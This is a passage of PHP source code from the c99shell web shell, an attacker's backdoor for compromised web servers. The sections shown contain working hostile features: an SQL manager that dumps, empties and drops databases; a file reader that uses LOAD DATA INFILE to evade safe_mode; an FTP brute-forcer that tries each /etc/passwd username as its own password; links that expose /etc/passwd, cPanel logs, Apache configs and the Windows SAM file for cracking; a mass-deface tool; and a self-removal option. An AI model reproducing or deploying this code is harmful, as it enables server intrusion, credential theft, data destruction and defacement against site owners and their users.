  if (is_dir($letter.":/"))
  {
   if ($letter.":" != $v) {$letters .= "<a href=\"".$surl."act=ls&d=".$letter.":\">[ ".$letter." ]</a> ";}
   else {$letters .= "<a href=\"".$surl."act=ls&d=".$letter.":\">[ <font color=\"green\">".$letter."</font> ]</a> ";}
  }
 }
 if (!empty($letters)) {echo "<br><b>Detected drives</b>: ".$letters;}
}
?></p></td></tr></table><br><?php
if ((!empty($donated_html)) and (in_array($act,$donated_act)))
{
 ?><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><?php echo $donated_html; ?></td></tr></table><br><?php
}
?><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><?php
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 $sql_surl = $surl."act=sql";
 if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
 ?><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php
 if ($sql_server)
 {
  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
  $err = mysql_error();
  @mysql_select_db($sql_db,$sql_sock);
  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_error();}
 }
 else {$sql_sock = false;}
 echo "<b>SQL Manager:</b><br>";
 if (!$sql_sock)
 {
  if (!$sql_server) {echo "NO CONNECTION";}
  else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
 }
 else
 {
  $sqlquicklaunch = array();
  $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
  if (!$sql_db) {$sqlquicklaunch[] = array("Query","#\" onclick=\"alert('Please, select DB!')");}
  else {$sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query");}
  $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
  $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
  $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
  $sqlquicklaunch[] = array("Logout",$surl."act=sql");
 
  echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";

  if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><u>".$item[0]."</u></a> ] ";}}
  echo "</center>";
 }
 echo "</td></tr><tr>";
 if (!$sql_sock) {?><td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td>Username</td><td align=right>Password&nbsp;</td></tr><form><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td align=right><input type="password" name="sql_passwd" value="" maxlength="64"></td></tr><tr><td>HOST</td><td>PORT</td></tr><tr><td><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php }
 else
 {
  //Start left panel
  if (!empty($sql_db))
  {
   ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade><?php
   $result = mysql_list_tables($sql_db);
   if (!$result) {echo mysql_error();}
   else
   {
    echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
    $c = 0;
    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM $row[0]"); $count_row = mysql_fetch_array($count); echo "<b>»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>
"; mysql_free_result($count); $c++;}
    if (!$c) {echo "No tables found in database.";}
   }
  }
  else
  {
   ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php
   $result = mysql_list_dbs($sql_sock);
   if (!$result) {echo mysql_error();}
   else
   {
    ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db"><?php
    echo "<option value=\"\">Databases (...)</option>
";
    $c = 0;
    while ($row = mysql_fetch_row($result)) {echo "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {echo " selected";} echo ">".$row[0]."</option>
"; $c++;}
   }
   ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php
  }
  //End left panel
  echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">";
  //Start center panel
  if ($sql_db)
  {
   echo "<center><b>There are ".$c." tables in this DB (".htmlspecialchars($sql_db).").<br>";
   if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><u>".$item[0]."</u></a> ] ";}}
   echo "</b></center>";

   $acts = array("","dump");

   if ($sql_act == "query")
   {
    echo "<hr size=\"1\" noshade>";
    if ($submit)
    {
     if ((!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
    }
    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
    if ((!$submit) or ($sql_act)) {echo "<form method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to  :";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"60\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form>";}
   }
   if (in_array($sql_act,$acts))
   {
    ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>SQL-Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".$SERVER_NAME."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
    if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
    if ($sql_act == "newtpl")
    {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
    }
    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_error();}
   }
   elseif ($sql_act == "dump")
   {
    $set = array();
    $set["sock"] = $sql_sock;
    $set["db"] = $sql_db;
    $dump_out = "print";               
    if ($dump_out == "print") {$set["print"] = 1; $set["nl2br"] = 1;}
    elseif ($dump_out == "download")
    {
     @ob_clean();
     header("Content-type: c99shell");
     header("Content-disposition: attachment; filename=\"".$f."\";"); 
     $set["print"] = 1;
     $set["nl2br"] = 1;
    }
    $set["file"] = $dump_file;
    $set["add_drop"] = true;
    $ret = mysql_dump($set);
    if ($dump_out == "download") {exit;}
   }
   else
   {
    $result = mysql_query("SHOW TABLE STATUS", $sql_sock) or print(mysql_error()); 
    echo "<br><form method=\"POST\"><TABLE cellSpacing=0 cellPadding=1 bgColor=#333333 borderColorLight=#333333 border=1>";
    echo "<tr>";
    echo "<td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td>";
    echo "<td><center><b>Table</b></center></td>";
    echo "<td><b>Rows</b></td>";
    echo "<td><b>Type</b></td>";
    echo "<td><b>Created</b></td>";
    echo "<td><b>Modified</b></td>";
    echo "<td><b>Size</b></td>";
    echo "<td><b>Action</b></td>";
    echo "</tr>";
    $i = 0;
    $tsize = $trows = 0;
    while ($row = mysql_fetch_array($result, MYSQL_NUM))
    {
     $tsize += $row["5"];
     $trows += $row["5"];
     $size = view_size($row["5"]);
     echo "<tr>";
     echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row[0]."\"></td>";
     echo "<td>&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".$row[0]."</b></a>&nbsp;</td>";
     echo "<td>".$row[3]."</td>";
     echo "<td>".$row[1]."</td>";
     echo "<td>".$row[10]."</td>";
     echo "<td>".$row[11]."</td>";
     echo "<td>".$size."</td>";
     echo "<td>
&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row[0]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" height=\"13\" width=\"11\" border=\"0\"></a>
&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row[0]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" height=\"13\" width=\"11\" border=\"0\"></a>
<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row[0]."`")."\"><img src=\"".$surl."act=img&img=sql_button_insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;
</td>";
     echo "</tr>";
     $i++;
    }
    echo "<tr bgcolor=\"000000\">";
    echo "<td><center><b>»</b></center></td>";
    echo "<td><center><b>".$i." table(s)</b></center></td>";
    echo "<td><b>".$trows."</b></td>";
    echo "<td>".$row[1]."</td>";
    echo "<td>".$row[10]."</td>";
    echo "<td>".$row[11]."</td>";
    echo "<td><b>".view_size($tsize)."</b></td>";
    echo "<td></td>";
    echo "</tr>";
    echo "</table><hr size=\"1\" noshade><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"actselect\">
<option>With selected:</option>
<option value=\"drop\" >Drop</option>
<option value=\"empty\" >Empty</option>
<option value=\"chk\">Check table</option>
<option value=\"Optimize table\">Optimize table</option>
<option value=\"Repair table\">Repair table</option>
<option value=\"Analyze table\">Analyze table</option>
</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form>";
    mysql_free_result($result);
   }
  }
  }
  else
  {
   $acts = array("","newdb","serverstat","servervars","processes","getfile");
   if (in_array($sql_act,$acts))
   {
    ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
   }
   if (!empty($sql_act))
   {
    echo "<hr size=\"1\" noshade>";
    if ($sql_act == "newdb")
    {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_error();}
    }
    if ($sql_act == "serverstatus")
    {
     $result = mysql_query("SHOW STATUS", $sql_sock); 
     echo "<center><b>Server-status variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";} 
     echo "</table></center>";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars")
    {
     $result = mysql_query("SHOW VARIABLES", $sql_sock); 
     echo "<center><b>Server variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";} 
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "processes")
    {
     if (!empty($kill)) {$query = 'KILL ' . $kill . ';'; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock); 
     echo "<center><b>Processes:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td>STATE</td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    elseif (($sql_act == "getfile"))
    {
     if (!mysql_create_db("tmp_bd")) {echo mysql_error();}
     elseif (!mysql_select_db("tmp_bd")) {echo mysql_error();}
     elseif (!mysql_query('CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );')) {echo mysql_error();}
     else {mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file"); $query = "SELECT * FROM tmp_file"; $result = mysql_query($query); if (!$result) {echo "Error in query \"".$query."\": ".mysql_error();}
     else
     {
      for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
      $f = ""; 
      while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {foreach ($line as $key =>$col_value) {$f .= $col_value;}}
      if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b>";}
      else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f));}
     }
     mysql_free_result($result);
     if (!mysql_drop_db("tmp_bd")) {echo ("Can't drop tempory DB \"tmp_bd\"!");}
     }
    }
   }
  }
 }
 echo "</tr></table></table>";
}
if ($act == "mkdir")
{
 if ($mkdir != $d) {if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";} elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}}
 echo "<br><br>";
 $act = $dspact = "ls";
}
if ($act == "ftpquickbrute")
{
 echo "<b>Ftp Quick brute:</b><br>";
 if ($win) {echo "This functions not work in Windows!<br><br>";}
 else
 {
  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
  {
   if ($fqb_onlywithsh)
   {
    if (!in_array($sh,array("/bin/bash","/bin/sh","/usr/local/cpanel/bin/jailshell"))) {$true = false;}
    else {$true = true;}
   }
   else {$true = true;}
   if ($true)
   {
    $sock = @ftp_connect($host,$port,$timeout);
    if (@ftp_login($sock,$login,$pass))
    {
     echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
     ob_flush();
     return true;
    }
   }
  }
  if (!empty($submit))
  {
   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
   $fp = fopen("/etc/passwd","r");
   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
   else
   {
    ob_flush();
    $i = $success = 0;
    $ftpquick_st = getmicrotime();
    while(!feof($fp))
    { 
     $str = explode(":",fgets($fp,2048));
     if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
     {
      $success++;
     }
     if ($i > $fqb_lenght) {break;}
     $i++;
    } 
    if ($success == 0) {echo "No success. connections!";}
    $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
    echo "<hr size=\"1\" noshade><b>Done!<br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=\"green\"><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br><b>Connects per second: ".round($i/$ftpquick_t,2)."</b><br>";
   }
  }
  else {echo "<form method=\"POST\"><br>Read first: <input type=\"text\" name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br><input type=\"submit\" name=\"submit\" value=\"Brute\"></form>";}
 }
}
if ($act == "lsa")
{
 echo "<center><b>Server security information:</b></center>";
 echo "<b>Software:</b> ".PHP_OS.", ".$SERVER_SOFTWARE."<br>";
 echo "<b>Safe-Mode: ".$hsafemode."</b><br>";
 echo "<b>Open base dir: ".$hopenbasedir."</b><br>";
 if (!$win)
 {
  if ($nixpasswd)
  {
   if ($nixpasswd == 1) {$nixpasswd = 0;}
   $num = $nixpasswd + $nixpwdperpage;
   echo "<b>*nix /etc/passwd:</b><br>";
   $i = $nixpasswd;
   while ($i < $num)
   {
    $uid = posix_getpwuid($i);
    if ($uid) {echo join(":",$uid)."<br>";}
    $i++;
   }
  }
  else {echo "<br><a href=\"".$surl."act=lsa&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}
  if (file_get_contents("/etc/userdomains")) {echo "<b><font color=\"green\"><a href=\"".$surl."act=f&f=userdomains&d=/etc/&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}
  if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=\"green\"><a href=\"".$surl."act=f&f=accounting.log&d=/var/cpanel/&ft=txt\"><u><b>View cpanel logs</b></u></a></font></b><br>";}
  if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=\"green\"><a href=\"".$surl."act=f&f=httpd.conf&d=/usr/local/apache/conf/&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
  if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=\"green\"><a href=\"".$surl."act=f&f=httpd.conf&d=/etc/&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
 }
 else
 {
  $v = $_SERVER["WINDIR"]."\repair\sam";
  if (file_get_contents($v)) {echo "<b><font color=\"red\">You can't crack winnt passwords(".$v.") </font></b><br>";}
  else {echo "<b><font color=\"green\">You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+.</font></b><br>";}
 }
}
if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}
if ($act == "fsbuff")
{
 $arr_copy = $sess_data["copy"];
 $arr_cut = $sess_data["cut"];
 $arr = array_merge($arr_copy,$arr_cut);
 if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}
 else
 {
  echo "<b>File-System buffer</b><br><br>";
  $ls_arr = $arr;
  $disp_fullpath = true;
  $act = "ls";
 }
}
if ($act == "selfremove")
{
 if (!empty($submit))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99shell v.".$shver."!"; exit; }
  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
 }
 else
 {
  $v = array();
  for($i=0;$i<8;$i++) {$v[] = "<a href=\"".$surl."\"><u><b>NO</b></u></a>";}
  $v[] = "<a href=\"#\" onclick=\"if (confirm('Are you sure?')) document.location='".$surl."act=selfremove&submit=1';\"><u>YES</u></a>";
  shuffle($v);
  $v = join("&nbsp;&nbsp;&nbsp;",$v);
  echo "<b>Self-remove: ".__FILE__." <br>Are you sure?</b><center>".$v."</center>";
 }
}
if ($act == "massdeface")
{
 if (empty($deface_in)) {$deface_in = $d;}
 if (empty($deface_name)) {$deface_name = "(.*)"; $deface_name_regexp = 1;}
 if (empty($deface_text_wwo)) {$deface_text_regexp = 0;}

 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;

  $text = $deface_text;
  $text_regexp = $deface_text_regexp;
  if (empty($text)) {$text = " "; $text_regexp = 1;}

  $a = array
  (
   "name"=>$deface_name, "name_regexp"=>$deface_name_regexp,
   "text"=>$text, "text_regexp"=>$text_regxp,
   "text_wwo"=>$deface_text_wwo,
   "text_cs"=>$deface_text_cs,
   "text_not"=>$deface_text_not
  );
  $defacetime = getmicrotime();
  $in = array_unique(explode(";",$deface_in));
  foreach($in as $v) {c99fsearch($v);}
  $defacetime = round(getmicrotime()-$defacetime,4);
  if (count($found) == 0) {echo "<b>No files found!</b>";}
  else
  {
   $ls_arr = $found;
   $disp_fullpath = true;
   $act = $dspact = "ls";
  }
 }
 else
 {
  if (empty($deface_preview)) {$deface_preview = 1;}
  if (empty($deface_html)) {$deface_html = "</div></table><br>Mass-defaced with c99shell v. ".$shver.", coded by tristram[<a href=\"http://ccteam.ru\">CCTeaM</a>].</b>";}
 }
 echo "<form method=\"POST\">";
 if (!$submit) {echo "<big><b>Attention! It's a very dangerous feature, you may lost your data.</b></big><br><br>";}
 echo "<input type=\"hidden\" name=\"d\" value=\"".$dispd."\">
<b>Deface for (file/directory name): </b><input type=\"text\" name=\"deface_name\" size=\"".round(strlen($deface_name)+25)."\" value=\"".htmlspecialchars($deface_name)."\">&nbsp;<input type=\"checkbox\" name=\"deface_name_regexp\" value=\"1\" ".gchds($deface_name_regexp,1," checked")."> - regexp
<br><b>Deface in (explode \";\"): </b><input type=\"text\" name=\"deface_in\" size=\"".round(strlen($deface_in)+25)."\" value=\"".htmlspecialchars($deface_in)."\">
<br><br><b>Search text:</b><br><textarea name=\"deface_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($deface_text)."</textarea>
<br><br><input type=\"checkbox\" name=\"deface_text_regexp\" value=\"1\" ".gchds($deface_text_regexp,1," checked")."> - regexp
&nbsp;&nbsp;<input type=\"checkbox\" name=\"deface_text_wwo\" value=\"1\" ".gchds($deface_text_wwo,1," checked")."> - <u>w</u>hole words only
&nbsp;&nbsp;<input type=\"checkbox\" name=\"deface_text_cs\" value=\"1\" ".gchds($deface_text_cs,1," checked")."> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type=\"checkbox\" name=\"deface_text_not\" value=\"1\" ".gchds($deface_text_not,1," checked")."> - find files <u>NOT</u> containing the text
<br><input type=\"checkbox\" name=\"deface_preview\" value=\"1\" ".gchds($deface_preview,1," checked")."> - <b>PREVIEW AFFECTED FILES</b>
<br><br><b>Html of deface:</b><br><textarea name=\"deface_html\" cols=\"122\" rows=\"10\">".htmlspecialchars($deface_html)."</textarea>
<br><br><input type=\"submit\" name=\"submit\" value=\"Deface\"></form>";
 if ($act == "ls") {echo "<hr size=\"1\" noshade><b>Deface took ".$defacetime." secs</b><br><br>";}
}
if ($act == "search")
{
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}

 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;
  $a = array
  (
   "name"=>$search_name, "name_regexp"=>$search_name_regexp,
   "text"=>$search_text, "text_regexp"=>$search_text_regxp,
   "text_wwo"=>$search_text_wwo,
   "text_cs"=>$search_text_cs,
   "text_not"=>$search_text_not
  );
  $searchtime = getmicrotime();
  $in = array_unique(explode(";",$search_in));
  foreach($in as $v)
  {
   c99fsearch($v);
  }
  $searchtime = round(getmicrotime()-$searchtime,4);
  if (count($found) == 0) {echo "<b>No files found!</b>";}
  else
  {
   $ls_arr = $found;
   $disp_fullpath = true;
   $act = $dspact = "ls";
  }
 }
 echo "<form method=\"POST\">
<input type=\"hidden\" name=\"d\" value=\"".$dispd."\">
<b>Search for (file/directory name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".gchds($search_name_regexp,1," checked")."> - regexp
<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">
<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea>
<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".gchds($search_text_regexp,1," checked")."> - regexp
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".gchds($search_text_wwo,1," checked")."> - <u>w</u>hole words only
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".gchds($search_text_cs,1," checked")."> - cas<u>e</u> sensitive
